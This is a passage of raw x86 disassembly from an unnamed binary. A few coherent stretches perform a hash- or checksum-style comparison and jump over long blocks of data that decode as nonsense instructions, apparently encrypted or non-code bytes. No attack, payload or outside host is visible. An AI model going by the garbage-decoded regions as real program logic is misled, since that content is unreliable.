  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	es sbb ch,cl
  40b50a:	mov    ch,0xe8
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	add    BYTE PTR [edx-0x34],bl
  40b516:	xor    al,0x87
  40b518:	add    BYTE PTR [edi+esi*1+0x17d7a7f8],dh
  40b51f:	fistp  WORD PTR [esi+0x5c]
  40b522:	daa    
  40b523:	(bad)  
  40b524:	xor    bh,BYTE PTR ds:0xe6a73beb
  40b52a:	pushf  
  40b52b:	push   ebp
  40b52c:	shl    ch,0xbd
  40b52f:	cmp    ebx,esp
  40b531:	xchg   esi,eax
  40b532:	or     DWORD PTR [edi-0x6dffd30],edi
  40b538:	cmp    DWORD PTR [eax],0x214d32d1
  40b53e:	cld    
  40b53f:	daa    
  40b540:	xchg   ecx,eax
  40b541:	or     DWORD PTR [ebx-0x21],edi
  40b544:	packssdw mm7,QWORD PTR [edi+0x35]
  40b548:	leave  
  40b549:	scas   al,BYTE PTR es:[edi]
  40b54a:	inc    ebp
  40b54b:	imul   edi,DWORD PTR [edx+0xa],0x2bcc85ef
  40b552:	adc    ecx,eax
  40b554:	dec    eax
  40b555:	mov    bh,0x62
  40b557:	dec    ecx
  40b558:	in     al,0x9d
  40b55a:	inc    ebp
  40b55b:	enter  0xea9,0x78
  40b55f:	xchg   esi,eax
  40b560:	leave  
  40b561:	inc    ebp
  40b562:	sub    ch,BYTE PTR [ebx-0x78ea8dbf]
  40b568:	mov    ebp,DWORD PTR [edx+edx*4]
  40b56b:	test   BYTE PTR [edi+0x4],cl
  40b56e:	sbb    BYTE PTR [ecx+eax*1-0x41bc0069],0xdd
  40b576:	jbe    0x40b52d
  40b578:	mov    DWORD PTR [ebx-0xff1eaff],ebp
  40b57e:	jbe    0x40b5e4
  40b580:	in     al,dx
  40b581:	je     0x40b53c
  40b583:	in     eax,0xd5
  40b585:	in     eax,dx
  40b586:	arpl   WORD PTR [ebx-0x5b],bp
  40b589:	mov    cl,0x55
  40b58b:	sbb    BYTE PTR [esp+esi*4],dh
  40b58e:	xor    al,BYTE PTR [edi]
  40b590:	or     BYTE PTR [ecx],al
  40b592:	xor    cl,dh
  40b594:	pop    ds
  40b595:	xchg   ecx,eax
  40b596:	bts    DWORD PTR [eax-0x15],esp
  40b59a:	jp     0x40b61b
  40b59c:	inc    ecx
  40b59d:	stos   BYTE PTR es:[edi],al
  40b59e:	rol    BYTE PTR [edi-0x1],0x8b
  40b5a2:	(bad)  
  40b5a3:	(bad)
  40b5a6:	push   0xffffff98
  40b5a8:	sub    edx,ebp
  40b5aa:	push   ecx
  40b5ab:	sub    DWORD PTR [edi+edi*4+0x30],0x75
  40b5b0:	pop    ecx
  40b5b1:	pop    esp
  40b5b2:	stc    
  40b5b3:	push   cs
  40b5b4:	xchg   ebx,eax
  40b5b5:	add    ah,BYTE PTR [ecx]
  40b5b7:	sbb    al,0x37
  40b5b9:	xor    al,0xe0
  40b5bb:	sar    esp,cl
  40b5bd:	sbb    al,0xd6
  40b5bf:	repnz daa 
  40b5c1:	les    ecx,FWORD PTR [edx+0x7b0111d7]
  40b5c7:	icebp  
  40b5c8:	mov    edx,0x6381de5e
  40b5cd:	push   ecx
  40b5ce:	or     al,0x96
  40b5d0:	ficomp WORD PTR [eax+ebx*2]
  40b5d3:	int    0xff
  40b5d5:	fs call 0x533a:0x36fc7e88
  40b5dd:	sbb    bh,BYTE PTR [eax+0xec3c7e8]
  40b5e3:	(bad)  
  40b5e4:	es je  0x40b621
  40b5e7:	enter  0xfc9f,0x78
  40b5eb:	add    eax,0x435f9e6
  40b5f0:	int    0x90
  40b5f2:	fbld   TBYTE PTR [eax+0x46]
  40b5f5:	popf   
  40b5f6:	xor    BYTE PTR [ebp+0x27],ah
  40b5f9:	fstp   QWORD PTR ds:0x5fc08147
  40b5ff:	inc    ebp
  40b600:	push   cs
  40b601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b602:	out    0xe0,al
  40b604:	cld    
  40b605:	dec    ebx
  40b606:	adc    esp,edi
  40b608:	js     0x40b632
  40b60a:	and    eax,0x3f789b7a
  40b60f:	adc    al,0x7c
  40b611:	jmp    0x40b606
  40b613:	or     BYTE PTR [ebx+0x57319a32],ch
  40b619:	stc    
  40b61a:	xchg   DWORD PTR [ebp+0x3c],edx
  40b61d:	jp     0x40b60e
  40b61f:	push   ebp
  40b620:	pop    ebx
  40b621:	dec    eax
  40b622:	(bad)  
  40b624:	xor    BYTE PTR [ebx-0x5f],cl
  40b627:	or     DWORD PTR [esi+0x1e],0xbe67cce1
  40b62e:	jmp    0x40b61f
  40b630:	fsub   QWORD PTR [ebx+0x44139522]
  40b636:	or     al,0x80
  40b638:	jecxz  0x40b605
  40b63a:	pop    es
  40b63b:	or     al,0xc4
  40b63d:	sbb    cl,dl
  40b63f:	cmp    DWORD PTR [ebp+0x2a822050],0x59426df9
  40b649:	pop    ecx
  40b64a:	and    al,0x28
  40b64c:	aas    
  40b64d:	enter  0x5660,0x71
  40b651:	jmp    0xea2c062d
  40b656:	out    dx,eax
  40b657:	call   0x547b:0xef8ac27b
  40b65e:	inc    ecx
  40b65f:	out    dx,eax
  40b660:	lahf   
  40b661:	xchg   edi,eax
  40b662:	es or  cl,dh
  40b665:	mov    eax,ds:0x49039c8a
  40b66a:	sar    BYTE PTR [esi],0x63
  40b66d:	jb     0x40b635
  40b66f:	xchg   esp,eax
  40b670:	out    dx,al
  40b671:	inc    esp
  40b672:	push   ebp
  40b673:	xchg   esp,eax
  40b674:	outs   dx,BYTE PTR ds:[esi]
  40b675:	dec    edx
  40b676:	ds mov ebp,0xc66cab68
  40b67c:	or     eax,DWORD PTR [esi-0x20]
  40b67f:	outs   dx,DWORD PTR ds:[esi]
  40b680:	imul   ebp,eax,0x7dac2f66
  40b686:	(bad)  
  40b687:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b689:	ins    BYTE PTR es:[edi],dx
  40b68a:	mov    ds:0x554e7dba,eax
  40b68f:	mov    edx,edx
  40b691:	mov    ?,WORD PTR [edx+0x636fd240]
  40b697:	scas   al,BYTE PTR es:[edi]
  40b698:	mov    esp,0xdeed34de
  40b69d:	sahf   
  40b69e:	in     eax,0x7c
  40b6a0:	push   eax
  40b6a1:	lods   al,BYTE PTR ds:[esi]
  40b6a2:	mov    ebx,0x8e4d94f7
  40b6a7:	retf   
  40b6a8:	sub    al,0xa5
  40b6aa:	mov    ch,ch
  40b6ac:	hlt    
  40b6ad:	rcr    BYTE PTR [edi],1
  40b6af:	inc    ebp
  40b6b0:	sahf   
  40b6b1:	add    BYTE PTR [edx],0x2b
  40b6b4:	lock jo 0x40b66b
  40b6b7:	ret    0x57f8
  40b6ba:	outs   dx,DWORD PTR ds:[esi]
  40b6bb:	adc    DWORD PTR [esi],ecx
  40b6bd:	jge    0x40b72b
  40b6bf:	sti    
  40b6c0:	mov    bl,0x55
  40b6c2:	scas   eax,DWORD PTR es:[edi]
  40b6c3:	dec    esi
  40b6c4:	jnp    0x40b680
  40b6c6:	xor    al,0xe2
  40b6c8:	lods   al,BYTE PTR ds:[esi]
  40b6c9:	enter  0x686e,0x84
  40b6cd:	(bad)  [eax]
  40b6cf:	arpl   WORD PTR [ecx-0x3f5c26ea],ax
  40b6d5:	pop    edx
  40b6d6:	mov    ecx,0x168895fb
  40b6db:	sub    eax,DWORD PTR [edx-0x1d]
  40b6de:	lods   al,BYTE PTR ds:[esi]
  40b6df:	leave  
  40b6e0:	std    
  40b6e1:	inc    ebp
  40b6e2:	sub    ax,0xe228
  40b6e6:	jl     0x40b702
  40b6e8:	aad    0xbd
  40b6ea:	pusha  
  40b6eb:	mov    dh,0x19
  40b6ed:	sbb    al,0x47
  40b6ef:	mov    ebp,0x659164a9
  40b6f4:	push   ebx
  40b6f5:	cs mov al,0x5b
  40b6f8:	mov    ah,0xd6
  40b6fa:	mov    dl,0x8c
  40b6fc:	xchg   DWORD PTR [esi],ebp
  40b6fe:	push   0xde40b9d5
  40b703:	ror    DWORD PTR ds:[ebp+0xc071c95],0xba
  40b70b:	dec    edi
  40b70c:	and    dh,BYTE PTR [ecx]
  40b70e:	cmp    esi,esi
  40b710:	adc    edi,edx
  40b712:	ds (bad) 
  40b714:	push   ecx
  40b715:	xor    BYTE PTR [ecx-0x72],ah
  40b718:	iret   
  40b719:	in     al,0x3
  40b71b:	push   ds
  40b71c:	and    edi,edi
  40b71e:	xchg   DWORD PTR [eax*1-0x1e9d05b8],edi
  40b725:	jge    0x40b730
  40b727:	inc    esp
  40b728:	call   0x1010:0x61115264
  40b72f:	and    eax,0x7c4305a2
  40b734:	jge    0x40b7ab
  40b736:	test   BYTE PTR [ebx+eax*8],ch
  40b739:	pop    esp
  40b73a:	std    
  40b73b:	jecxz  0x40b795
  40b73d:	jle    0x40b773
  40b73f:	imul   eax,DWORD PTR [esi],0xffffffb2
  40b742:	addr16 mov ds:0x9d1a,al
  40b746:	std    
  40b747:	repnz not DWORD PTR ds:0x9fac3b7b
  40b74e:	xchg   edx,eax
  40b74f:	xor    dh,BYTE PTR ds:0x1969cb84
  40b755:	stos   BYTE PTR es:[edi],al
  40b756:	cwde   
  40b757:	pop    ds
  40b758:	(bad)  
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	shl    DWORD PTR [ebx],1
  40b78c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78d:	fbstp  TBYTE PTR [edx+0x387e7efe]
  40b793:	jl     0x40b813
  40b795:	jle    0x40b7a3
  40b797:	pop    ds
  40b798:	pushf  
  40b799:	pop    ds
  40b79a:	shl    DWORD PTR [esi],0xe
  40b79d:	shl    DWORD PTR [edi-0x44c70d2a],1
  40b7a3:	inc    esi
  40b7a4:	scas   al,BYTE PTR es:[edi]
  40b7a5:	mov    esp,es
  40b7a7:	adc    eax,0x5620322e
  40b7ac:	clc    
  40b7ad:	adc    cl,BYTE PTR ds:0x72ab8c33
  40b7b3:	jl     0x40b777
  40b7b5:	mov    ah,0x9e
  40b7b7:	mov    eax,ds:0x40d69799
  40b7bc:	xlat   BYTE PTR ds:[ebx]
  40b7bd:	shl    DWORD PTR [eax-0x43],0x8c
  40b7c1:	loop   0x40b7c6
  40b7c3:	ret    0xa29
  40b7c6:	add    bl,BYTE PTR [esp+edi*8-0x24]
  40b7ca:	scas   eax,DWORD PTR es:[edi]
  40b7cb:	aas    
  40b7cc:	mov    ebx,ebx
  40b7ce:	(bad)  
  40b7d0:	fiadd  DWORD PTR [edi-0x44970a86]
  40b7d6:	int    0xeb
  40b7d8:	mov    dl,0xa2
  40b7da:	jnp    0x40b7d6
  40b7dc:	xor    DWORD PTR [ebx+0x18],edi
  40b7df:	xchg   edi,eax
  40b7e0:	gs fwait
  40b7e2:	sbb    BYTE PTR [ebx],dl
  40b7e4:	xor    cl,dh
  40b7e6:	jae    0x40b7cb
  40b7e8:	lock shl DWORD PTR [ebp+0x5e],cl
  40b7ec:	add    cl,al
  40b7ee:	sub    al,0x2
  40b7f0:	cwde   
  40b7f1:	jae    0x40b83f
  40b7f3:	ins    BYTE PTR es:[edi],dx
  40b7f4:	xor    ecx,esi
  40b7f6:	jg     0x40b7a0
  40b7f8:	or     BYTE PTR [ebp+0x0],bh
  40b7fb:	mov    WORD PTR [edx-0x42],cs
  40b7fe:	std    
  40b7ff:	in     al,dx
  40b800:	cmp    DWORD PTR [edi+edx*2+0x6707c655],esi
  40b807:	ss and dl,bh
  40b80a:	int    0x2c
  40b80c:	(bad)  
  40b80d:	pop    ebx
  40b80e:	cmp    eax,0x378639a7
  40b813:	sti    
  40b814:	sub    eax,esp
  40b816:	sbb    dl,dh
  40b818:	popa   
  40b819:	inc    ecx
  40b81a:	test   DWORD PTR [ecx-0x49],eax
  40b81d:	mov    esi,0xa6e522de
  40b822:	push   es
  40b823:	mov    edi,0x3d2d4c0b
  40b828:	and    eax,0x70dbb98c
  40b82d:	scas   eax,DWORD PTR es:[edi]
  40b82e:	mov    dl,0x9
  40b830:	xchg   DWORD PTR [esi-0x4ea05ea7],eax
  40b836:	mov    ecx,DWORD PTR [ecx-0x1e8063ce]
  40b83c:	mov    edi,0x92958b5a
  40b841:	ja     0x40b8b5
  40b843:	ins    DWORD PTR es:[edi],dx
  40b844:	jmp    0x69ee:0xf5cae93d
  40b84b:	sub    eax,0xbb2a55e6
  40b850:	cmp    ah,dl
  40b852:	sar    BYTE PTR [ebp+ebp*1-0x6af0ee29],0xda
  40b85a:	mov    esi,0x981be5ba
  40b85f:	call   0x7f7114fd
  40b864:	test   al,0xc
  40b866:	add    al,0x47
  40b868:	jae    0x40b89f
  40b86a:	aas    
  40b86b:	or     BYTE PTR [ebp+0x13],al
  40b86e:	adc    BYTE PTR ds:0x1b355b66,bl
  40b874:	push   esp
  40b875:	pop    ebx
  40b876:	add    DWORD PTR [ecx+esi*8],edi
  40b879:	jne    0x40b7fc
  40b87b:	adc    edi,DWORD PTR [ebx+0x62]
  40b87e:	mov    ecx,0xf204b396
  40b883:	jne    0x40b814
  40b885:	sar    BYTE PTR [ebp-0x432b46d6],0x1f
  40b88c:	in     al,0x18
  40b88e:	adc    DWORD PTR [ebp+0x2f6ff54d],ebp
  40b894:	jb     0x40b817
  40b896:	test   dl,0x3d
  40b899:	pop    edi
  40b89a:	inc    edx
  40b89b:	cwde   
  40b89c:	or     cl,BYTE PTR [ecx-0x1f5e064]
  40b8a2:	push   ds
  40b8a3:	arpl   WORD PTR [edx-0x4a],sp
  40b8a6:	call   0xc229:0x50a94dd1
  40b8ad:	pop    ebp
  40b8ae:	hlt    
  40b8af:	xchg   edi,eax
  40b8b0:	jg     0x40b923
  40b8b2:	dec    esi
  40b8b3:	pop    ds
  40b8b4:	(bad)  
  40b8b5:	dec    ebp
  40b8b6:	mov    edx,0x36313e31
  40b8bb:	in     al,0x10
  40b8bd:	mov    ebp,0x3d15e755
  40b8c2:	retf   0xd914
  40b8c5:	and    al,0xe5
  40b8c7:	mov    al,BYTE PTR [esi+ecx*4-0x18]
  40b8cb:	push   ebp
  40b8cc:	cmp    DWORD PTR [ebx+0x71],esp
  40b8cf:	leave  
  40b8d0:	pop    ss
  40b8d1:	hlt    
  40b8d2:	stos   DWORD PTR es:[edi],eax
  40b8d3:	sbb    eax,0x868f5a01
  40b8d8:	dec    ebx
  40b8d9:	push   edi
  40b8da:	push   es
  40b8db:	das    
  40b8dc:	add    DWORD PTR [edi+esi*4],0xffffffd8
  40b8e0:	and    BYTE PTR [ebp-0xcfe70ff],ah
  40b8e6:	pop    ecx
  40b8e7:	in     al,0x0
  40b8e9:	inc    ebx
  40b8ea:	cdq    
  40b8eb:	dec    esi
  40b8ec:	loop   0x40b94f
  40b8ee:	mov    DWORD PTR [esp+eax*4],esp
  40b8f1:	data16 mov ah,0xb4
  40b8f4:	aam    0xf2
  40b8f6:	test   BYTE PTR [edi+edi*8+0x3ed2420b],ah
  40b8fd:	je     0x40b94e
  40b8ff:	inc    eax
  40b900:	mov    ax,ds:0x564de5f2
  40b906:	pop    ebp
  40b907:	cmp    BYTE PTR ds:0x7b8e58a,bl
  40b90d:	loope  0x40b8a0
  40b90f:	push   cs
  40b910:	lock lock iret 
  40b913:	imul   ebp,DWORD PTR [esi+0x42],0xffffffce
  40b917:	fs (bad) 
  40b919:	out    dx,al
  40b91a:	out    dx,al
  40b91b:	jmp    0x40b8be
  40b91d:	cld    
  40b91e:	jne    0x40b8e2
  40b920:	ror    DWORD PTR [esi],0x59
  40b923:	sbb    ebp,esi
  40b925:	pop    ds
  40b926:	adc    ecx,edx
  40b928:	outs   dx,DWORD PTR ds:[esi]
  40b929:	nop
  40b92a:	leave  
  40b92b:	fsubr  DWORD PTR [esi]
  40b92d:	xchg   DWORD PTR [ebx],eax
  40b92f:	(bad)  
  40b930:	fld    DWORD PTR [edx-0x76e440e8]
  40b936:	clc    
  40b937:	xchg   esp,eax
  40b938:	int3   
  40b939:	stos   DWORD PTR es:[edi],eax
  40b93a:	pop    ebx
  40b93b:	pop    esi
  40b93c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b93d:	jecxz  0x40b963
  40b93f:	fs and esp,ebp
  40b942:	inc    ebx
  40b943:	xor    al,0x81
  40b945:	adc    ch,BYTE PTR [esi+ebx*4]
  40b948:	cmp    DWORD PTR [ebx-0x4116a668],0x22cc7eeb
  40b952:	imul   edx,DWORD PTR [edx-0x12],0x6b3334e2
  40b959:	push   esp
  40b95a:	push   ebp
  40b95b:	mov    eax,0x6fb5b717
  40b960:	lods   al,BYTE PTR ds:[esi]
  40b961:	add    al,0x8e
  40b963:	enter  0x182b,0xab
  40b967:	mov    edi,DWORD PTR [ebp+esi*8-0x2999ed47]
  40b96e:	sbb    BYTE PTR [ebx+0x12db1d91],dh
  40b974:	sar    DWORD PTR ds:0x135ad505,1
  40b97a:	jle    0x40b9c1
  40b97c:	sub    esi,DWORD PTR [ecx]
  40b97e:	dec    ebp
  40b97f:	pusha  
  40b980:	xchg   BYTE PTR [edi],dh
  40b982:	icebp  
  40b983:	scas   al,BYTE PTR es:[edi]
  40b984:	(bad)  
  40b985:	sbb    ch,bh
  40b987:	(bad)
  40b98a:	outs   dx,BYTE PTR ds:[esi]
  40b98b:	pop    edi
  40b98c:	add    DWORD PTR [esi+0x2b],esp
  40b98f:	dec    esp
  40b990:	cmp    edx,DWORD PTR [ebp-0x28]
  40b993:	sti    
  40b994:	mov    dh,0xc3
  40b996:	ror    DWORD PTR [esi+ebp*8],0x3a
  40b99a:	ja     0x40b9ea
  40b99c:	call   0x5f76:0x5234fda5
  40b9a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a4:	cmp    eax,0xdb645dab
  40b9a9:	add    esi,DWORD PTR [esi-0x4ee996b1]
  40b9af:	ja     0x40ba1b
  40b9b1:	outs   dx,DWORD PTR ds:[esi]
  40b9b2:	push   esi
  40b9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b4:	mov    ?,WORD PTR [esi-0xa39494d]
  40b9ba:	pop    esp
  40b9bb:	ins    BYTE PTR es:[edi],dx
  40b9bc:	test   al,0x94
  40b9be:	xlat   BYTE PTR ds:[ebx]
  40b9bf:	lock dec bh
  40b9c2:	push   cs
  40b9c3:	add    ebp,DWORD PTR [edx]
  40b9c5:	popf   
  40b9c6:	adc    al,0x2d
  40b9c8:	aam    0x86
  40b9ca:	fld    TBYTE PTR [ebx+ebp*1-0x24]
  40b9ce:	cld    
  40b9cf:	shufps xmm4,XMMWORD PTR [ebx-0xb73026c],0x81
  40b9d7:	fsubr  DWORD PTR [esi]
  40b9d9:	push   0xffffff98
  40b9db:	xchg   edx,eax
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8-0x561557f8],eax
  40ba0f:	dec    ecx
  40ba10:	and    edi,DWORD PTR [ebp+edi*8+0x7e]
  40ba14:	jle    0x40ba4e
  40ba16:	jl     0x40ba96
  40ba18:	jle    0x40b9c3
  40ba1a:	xchg   edi,eax
  40ba1b:	inc    ecx
  40ba1c:	xchg   ebx,eax
  40ba1d:	jnp    0x40ba0a
  40ba1f:	(bad)  
  40ba20:	pop    ecx
  40ba21:	xor    eax,0x13434835
  40ba26:	mov    ds:0x43d3efe1,eax
  40ba2b:	jns    0x40b9b7
  40ba2d:	ror    ebp,0xf6
  40ba30:	(bad)  
  40ba31:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ba33:	ret    
  40ba34:	push   0x1d
  40ba36:	xchg   DWORD PTR [edx-0x105ab43d],ecx
  40ba3c:	pop    es
  40ba3d:	and    al,0x76
  40ba3f:	sub    eax,0x23aac8b4
  40ba44:	bound  edi,QWORD PTR [esi+0x10]
  40ba47:	xlat   BYTE PTR ds:[ebx]
  40ba48:	in     eax,dx
  40ba49:	jo     0x40baa5
  40ba4b:	pop    esi
  40ba4c:	cmovl  esp,DWORD PTR [eax-0x1f]
  40ba50:	ds cmc 
  40ba52:	inc    edi
  40ba53:	sbb    ebx,DWORD PTR [ecx-0x1c]
  40ba56:	jns    0x40ba73
  40ba58:	out    dx,al
  40ba59:	cmp    eax,ebx
  40ba5b:	push   ebx
  40ba5c:	cdq    
  40ba5d:	leave  
  40ba5e:	lods   al,BYTE PTR ds:[esi]
  40ba5f:	sbb    eax,0xcae54c74
  40ba64:	dec    edx
  40ba65:	(bad)  
  40ba66:	(bad)  
  40ba67:	jmp    DWORD PTR [esp+ebp*1-0x72]
  40ba6b:	and    eax,0xd79cd97e
  40ba70:	rcr    BYTE PTR [ebx+0xb392f9],1
  40ba76:	push   edi
  40ba77:	add    al,0x1b
  40ba79:	or     al,0x1b
  40ba7b:	mov    esp,0x76de3e31
  40ba80:	stos   BYTE PTR es:[edi],al
  40ba81:	mov    ah,0xaf
  40ba83:	ins    BYTE PTR es:[edi],dx
  40ba84:	sbb    DWORD PTR [ebx+ebp*2],0xffffffee
  40ba88:	and    DWORD PTR [esi+esi*4-0x5f],0x49
  40ba8d:	cmp    BYTE PTR ds:0xfaea810f,bh
  40ba93:	jb     0x40ba9e
  40ba95:	in     eax,dx
  40ba96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba97:	pop    ss
  40ba98:	enter  0x9db4,0x5
  40ba9c:	xchg   DWORD PTR [ecx],ebx
  40ba9e:	fbld   TBYTE PTR [esi-0x19]
  40baa1:	jno    0x40babb
  40baa3:	add    DWORD PTR [eiz*8-0x46c6dc23],eax
  40baaa:	mov    ecx,0xeeddaac8
  40baaf:	scas   eax,DWORD PTR es:[edi]
  40bab0:	push   ebx
  40bab1:	mov    gs,edi
  40bab3:	pop    ecx
  40bab4:	das    
  40bab5:	mov    ch,dl
  40bab7:	sbb    dl,0x28
  40baba:	xor    eax,0x3550ab2e
  40babf:	stos   DWORD PTR es:[edi],eax
  40bac0:	outs   dx,BYTE PTR ds:[esi]
  40bac1:	dec    eax
  40bac2:	dec    eax
  40bac3:	cmp    BYTE PTR ss:[esi],dh
  40bac6:	call   FWORD PTR [eax]
  40bac8:	js     0x40ba67
  40baca:	lock test al,0x9
  40bacd:	rcl    BYTE PTR [ebp+0xb],1
  40bad0:	(bad)  
  40bad1:	inc    ebx
  40bad2:	fs out 0x2c,eax
  40bad5:	add    BYTE PTR [ebp+0x3b],dh
  40bad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad9:	adc    al,BYTE PTR [ecx-0x58]
  40badc:	pop    es
  40badd:	add    al,0x9e
  40badf:	push   ecx
  40bae0:	outs   dx,DWORD PTR ds:[esi]
  40bae1:	popw   es
  40bae3:	pop    ds
  40bae4:	pop    ecx
  40bae5:	xor    BYTE PTR [edi-0x61fe26fe],0x6d
  40baec:	test   eax,0xee782a76
  40baf1:	je     0x40bb56
  40baf3:	enter  0x225c,0xd
  40baf7:	pop    ecx
  40baf8:	lods   al,BYTE PTR ds:[esi]
  40baf9:	int3   
  40bafa:	(bad)  
  40bafb:	ja     0x40bb3d
  40bafd:	stos   BYTE PTR es:[edi],al
  40bafe:	arpl   WORD PTR [ecx+edi*1],dx
  40bb01:	sbb    BYTE PTR [eax-0x7596a6c3],cl
  40bb07:	push   edx
  40bb08:	adc    edi,ecx
  40bb0a:	pop    ds
  40bb0b:	sub    eax,0xd04b21da
  40bb10:	pop    esi
  40bb11:	cmp    BYTE PTR [ebp-0x41],bl
  40bb14:	xor    eax,0xab75c9b0
  40bb19:	mov    eax,0x7b7ada76
  40bb1e:	pop    ecx
  40bb1f:	add    dl,BYTE PTR [ecx+esi*1-0x6e4623ca]
  40bb26:	add    BYTE PTR [ebx+edx*8],bl
  40bb29:	xchg   ebx,eax
  40bb2a:	aad    0x70
  40bb2c:	(bad)  [ecx-0x1]
  40bb2f:	mov    edi,es
  40bb31:	ja     0x40badd
  40bb33:	aas    
  40bb34:	or     al,0xa8
  40bb36:	loopne 0x40bb28
  40bb38:	and    ah,BYTE PTR [edi-0x7ff45432]
  40bb3e:	das    
  40bb3f:	mov    ds:0xd14aa430,al
  40bb44:	sbb    esp,DWORD PTR [ebx+0x78]
  40bb47:	retf   
  40bb48:	outs   dx,DWORD PTR ds:[esi]
  40bb49:	inc    esi
  40bb4a:	iret   
  40bb4b:	inc    esi
  40bb4c:	add    DWORD PTR [ecx-0x57],0x5b6c4bb
  40bb53:	cdq    
  40bb54:	popf   
  40bb55:	mov    cl,0x12
  40bb57:	mov    eax,ds:0xa16622df
  40bb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb5d:	ret    0x305f
  40bb60:	in     eax,dx
  40bb61:	push   ds
  40bb62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb63:	(bad)  
  40bb64:	push   0x51e93b4
  40bb69:	jns    0x40bba7
  40bb6b:	scas   eax,DWORD PTR es:[edi]
  40bb6c:	mov    edx,0xecae6693
  40bb71:	sbb    esp,ebp
  40bb73:	cmp    esi,DWORD PTR [ebx-0x15]
  40bb76:	adc    al,0x6e
  40bb78:	mov    BYTE PTR ds:0x95ef2ad8,dh
  40bb7e:	mov    ds:0x4765e0a5,eax
  40bb83:	xchg   ebx,eax
  40bb84:	mov    BYTE PTR [ebx+0x49],ch
  40bb87:	out    0x62,al
  40bb89:	xor    eax,DWORD PTR [ecx]
  40bb8b:	sbb    eax,0x20dac49f
  40bb90:	xor    eax,0xc2a8d2a4
  40bb95:	nop
  40bb96:	pop    ebx
  40bb97:	and    edx,DWORD PTR [ecx-0x26]
  40bb9a:	(bad)  
  40bb9b:	pop    ds
  40bb9c:	out    0x51,al
  40bb9e:	nop
  40bb9f:	cmp    al,0x64
  40bba1:	icebp  
  40bba2:	cmp    al,0xbd
  40bba4:	test   eax,0x87564410
  40bba9:	push   edi
  40bbaa:	shr    DWORD PTR [eax-0x6c],1
  40bbad:	cdq    
  40bbae:	dec    ecx
  40bbaf:	jne    0x40bba3
  40bbb1:	adc    BYTE PTR [edi],ch
  40bbb3:	sub    DWORD PTR [ecx+0x3],esp
  40bbb6:	and    eax,0x9117d99e
  40bbbb:	pop    eax
  40bbbc:	jp     0x40bc30
  40bbbe:	jb     0x40bba5
  40bbc0:	stos   BYTE PTR es:[edi],al
  40bbc1:	lock mov ds:0x3ba38468,al
  40bbc7:	lods   al,BYTE PTR ds:[esi]
  40bbc8:	pushf  
  40bbc9:	mov    ?,WORD PTR [ebx+0x37]
  40bbcc:	xor    BYTE PTR ds:0x829605ca,cl
  40bbd2:	pop    eax
  40bbd3:	adc    eax,0xe9d2eccd
  40bbd8:	and    BYTE PTR ds:0xe3f9b08d,bh
  40bbde:	std    
  40bbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe0:	lods   al,BYTE PTR ds:[esi]
  40bbe1:	js     0x40bbcb
  40bbe3:	sbb    eax,0x9c1cb0dc
  40bbe8:	out    0x37,eax
  40bbea:	call   FWORD PTR [edi]
  40bbec:	mov    ebp,0xba7820d4
  40bbf1:	sbb    eax,0x821df3ef
  40bbf6:	mov    cx,WORD PTR [edx-0x66d27667]
  40bbfd:	dec    eax
  40bbfe:	je     0x40bb94
  40bc00:	(bad)  
  40bc02:	ins    BYTE PTR es:[edi],dx
  40bc03:	and    al,0xa5
  40bc05:	int    0x30
  40bc07:	lahf   
  40bc08:	xor    cl,bl
  40bc0a:	inc    edx
  40bc0b:	sti    
  40bc0c:	pop    es
  40bc0d:	add    edi,DWORD PTR [ecx+0x6b]
  40bc10:	loop   0x40bc4b
  40bc12:	xchg   BYTE PTR [edi-0x3e32f602],bh
  40bc18:	pop    ebx
  40bc19:	(bad)  
  40bc1a:	jne    0x40bc60
  40bc1c:	push   ebx
  40bc1d:	push   eax
  40bc1e:	mov    ebp,0xd3689b07
  40bc23:	inc    ecx
  40bc24:	(bad)  
  40bc25:	cdq    
  40bc26:	call   0x14c9:0x1b506760
  40bc2d:	push   0x65b038d0
  40bc32:	in     eax,dx
  40bc33:	(bad)  
  40bc34:	mov    bl,0x50
